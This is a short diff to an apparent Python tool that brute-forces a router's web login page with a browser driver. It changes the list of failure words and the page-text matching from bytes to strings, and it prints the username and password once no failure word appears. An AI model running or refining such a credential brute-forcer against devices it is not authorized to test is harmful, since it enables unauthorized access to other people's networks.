@@ -47,7 +47,7 @@ def main():
     url = get_user_input('http://192.168.1.1', "Router's ip (default: http://192.168.1.1) : ", RESET)
     print("\r")
 
-    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}  #you can add your own login page errors messages here
+    expression = {"error", "incorrect", "failure", "try", "again", "invalid"}  # You can add your own login page errors messages here
 
     u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
     username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)
@@ -157,13 +157,13 @@ def brute(username, password, combinations_tested, total_combinations, driver, u
 
         time.sleep(2)
 
-        driver_lower_content = driver.page_source.lower().encode('utf-8')
-
+        driver_lower_content = driver.page_source.lower()
+        
         if not any(item in driver_lower_content for item in expression):
             print("\nBrute Forcing...")
             print("[+] Username: ", username)
             print("[+] Password: ", password)
-            print("Server Response:", driver.page_source.encode('utf-8'))
+            print("Server Response:", driver.page_source)
             sys.exit()
         else:
             print("Success condition not met")
